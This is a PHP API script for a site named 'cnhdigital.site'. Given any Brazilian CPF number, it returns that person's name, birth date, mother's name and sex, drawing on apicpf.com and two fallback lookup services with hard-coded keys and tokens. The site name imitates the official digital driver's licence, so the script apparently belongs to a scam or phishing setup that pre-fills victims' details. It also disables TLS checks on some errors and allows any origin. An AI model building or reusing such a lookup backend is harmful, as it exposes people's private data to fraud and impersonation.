<?php
/**
 * API CPF para o SPA cnhdigital.site
 * GET /api/consulta.php?cpf=00000000000
 * Resposta esperada pelo bundle: { DADOS: { nome, data_nascimento, nome_mae, ... } }
 * Usa a mesma APICPF da mango1.
 */
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Accept');
header('Cache-Control: no-store');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

$cpf = '';
if (!empty($_GET['cpf'])) {
    $cpf = preg_replace('/\D/', '', (string) $_GET['cpf']);
}
if ($cpf === '' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw = file_get_contents('php://input');
    $input = json_decode($raw, true);
    if (!is_array($input)) $input = $_POST;
    if (!empty($input['cpf'])) $cpf = preg_replace('/\D/', '', (string) $input['cpf']);
    if ($cpf === '' && !empty($input['d'])) {
        $decoded = base64_decode((string) $input['d'], true);
        if ($decoded !== false) $cpf = preg_replace('/\D/', '', $decoded);
    }
}

if ($cpf === '' || strlen($cpf) !== 11) {
    http_response_code(400);
    echo json_encode(['erro' => 'CPF inválido', 'DADOS' => null]);
    exit;
}

function httpGetJson($url, $headers = [], $timeout = 20) {
    if (!function_exists('curl_init')) return [null, 0];
    $opts = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; CNHDigital/1.0)',
    ];
    $ch = curl_init();
    curl_setopt_array($ch, $opts);
    $response = curl_exec($ch);
    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $errno = curl_errno($ch);
    curl_close($ch);
    if (($response === false || $httpCode === 0) && in_array($errno, [60, 77], true)) {
        $opts[CURLOPT_SSL_VERIFYPEER] = false;
        $opts[CURLOPT_SSL_VERIFYHOST] = 0;
        $ch = curl_init();
        curl_setopt_array($ch, $opts);
        $response = curl_exec($ch);
        $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
    }
    if ($response === false) return [null, 0];
    $json = json_decode($response, true);
    return [is_array($json) ? $json : null, $httpCode];
}

function toDateISO($apiDate) {
    if (empty($apiDate)) return '';
    if (preg_match('/^(\d{4})-(\d{2})-(\d{2})/', $apiDate, $m)) {
        return $m[1] . '-' . $m[2] . '-' . $m[3];
    }
    if (preg_match('/^(\d{2})\/(\d{2})\/(\d{4})$/', $apiDate, $m)) {
        return $m[3] . '-' . $m[2] . '-' . $m[1];
    }
    return '';
}

$result = null;
$APICPF_KEY = '3370051f4eaa75bf6dd8f4740f2c8fe346586ff089b858f05bbb8f28fb6e2c56';
$apicpfUrl = 'https://apicpf.com/api/consulta?cpf=' . rawurlencode($cpf);

[$json] = httpGetJson($apicpfUrl, [
    'Accept: application/json',
    'Content-Type: application/json',
    'X-API-KEY: ' . $APICPF_KEY,
], 20);

if (is_array($json) && isset($json['code']) && (int) $json['code'] === 200 && !empty($json['data']['nome'])) {
    $d = $json['data'];
    $sexo = '';
    if (!empty($d['genero'])) {
        $g = strtoupper((string) $d['genero']);
        $sexo = (strpos($g, 'M') === 0) ? 'M' : ((strpos($g, 'F') === 0) ? 'F' : substr($g, 0, 1));
    }
    $result = [
        'nome' => $d['nome'],
        'data_nascimento' => toDateISO($d['data_nascimento'] ?? ''),
        'nome_mae' => $d['nome_mae'] ?? ($d['mae'] ?? ''),
        'sexo' => $sexo,
        'cpf' => $d['cpf'] ?? $cpf,
    ];
}

if (!$result) {
    $fallbacks = [
        "https://api.amnesiatecnologia.rocks/?token=c5eebbc9-0469-4324-85f6-0c994b42d18a&cpf={$cpf}",
        "https://searchapi.dnnl.live/consulta?token_api=5145&cpf={$cpf}",
    ];
    foreach ($fallbacks as $url) {
        [$data] = httpGetJson($url, ['Accept: application/json'], 12);
        if (!is_array($data)) continue;
        if (!empty($data['DADOS']['nome'])) {
            $d = $data['DADOS'];
            $result = [
                'nome' => $d['nome'],
                'data_nascimento' => toDateISO($d['data_nascimento'] ?? ''),
                'nome_mae' => $d['nome_mae'] ?? '',
                'sexo' => !empty($d['sexo']) ? strtoupper(substr($d['sexo'], 0, 1)) : '',
                'cpf' => $d['cpf'] ?? $cpf,
            ];
            break;
        }
        if (!empty($data['dados'][0]['NOME'])) {
            $d = $data['dados'][0];
            $result = [
                'nome' => $d['NOME'],
                'data_nascimento' => toDateISO($d['NASC'] ?? ''),
                'nome_mae' => $d['NOME_MAE'] ?? '',
                'sexo' => !empty($d['SEXO']) ? strtoupper(substr($d['SEXO'], 0, 1)) : '',
                'cpf' => preg_replace('/\D/', '', $d['CPF'] ?? $cpf),
            ];
            break;
        }
    }
}

if ($result && !empty($result['nome'])) {
    $result['NOME'] = $result['nome'];
    $result['CPF'] = $result['cpf'];
    $result['NASCIMENTO'] = $result['data_nascimento'];
    $result['NASC'] = $result['data_nascimento'];
    $result['NOME_MAE'] = $result['nome_mae'];
    $result['SEXO'] = $result['sexo'];

    http_response_code(200);
    echo json_encode(['DADOS' => $result], JSON_UNESCAPED_UNICODE);
    exit;
}

http_response_code(404);
echo json_encode(['erro' => 'CPF não encontrado', 'DADOS' => null], JSON_UNESCAPED_UNICODE);